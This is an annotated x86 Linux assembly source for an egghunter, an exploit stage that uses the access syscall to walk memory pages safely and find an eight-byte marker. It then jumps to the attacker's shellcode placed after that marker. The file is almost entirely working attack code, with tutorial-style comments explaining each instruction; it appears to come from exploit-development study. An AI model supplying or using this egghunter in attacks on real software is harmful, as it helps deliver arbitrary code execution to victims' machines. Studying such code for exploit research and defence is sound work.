global _start
section .text
  _start:
    ;; Clear out edx. We will use
    ;; this to keep track of the memory
    ;; that we are searching
    xor edx,edx
  initpage:
    ;; Initialize edx to PAGE_SIZE 0x1000 or 4096 bytes
    or dx,0xfff
  incpage:
    inc edx
    ;; Load the address 4 bytes past edx into ebx
    ;; We do this so we can compare 8 bytes
    ;; e.g w00tw00t
    lea ebx,[edx+0x4]
    ;; Push the access(2) syscall number onto the stack
    ;; This pushes a 32-bit or 4 byte value onto
    ;; the stack as 0x00000021
    push byte +0x21
    ;; Place the syscall number into eax
    ;; Since we used a push pop to set eax
    ;; we get the top 3 bytes zeroed out without
    ;; having to worry about what their values were previously
    ;; this saves a byte over xor
    pop eax
    ;; Call our access system call
    int 0x80
    ;; Look at the result of the syscall.
    ;; If it is  0xf2 which represents the low byte
    ;;of the EFAULT return value
    cmp al,0xf2
    ;; We looked at invalid memory so go back
    ;; and increment the page and start again
    jz initpage
    ;; Otherwise start looking for our marker
    mov eax,0x50905090
    ;; scasd compares the value in eax with
    ;; with the a double word pointed to by edi
    ;; as such, we move the address in edx into edi
    mov edi,edx
    ;; and compare our marker
    ;; scasd is auto incremented (or decremented)
    scasd
    ;; if it doesn't match, go increment our page
    ;; and try again
    jnz incpage
    ;; if it does match, fingers crossed...
    ;; check the next 4 bytes
    ;; Since scasd auto increments edi, we are
    ;; looking at edi+4 now
    scasd
    ;; if we don't have a match, no soup for us
    ;; increment our page and try again
    jnz incpage
    ;; if we had a match, scasd incremented edit
    ;; once again so when we jump there we should
    ;; be jumping to our shellcode!
    jmp edi
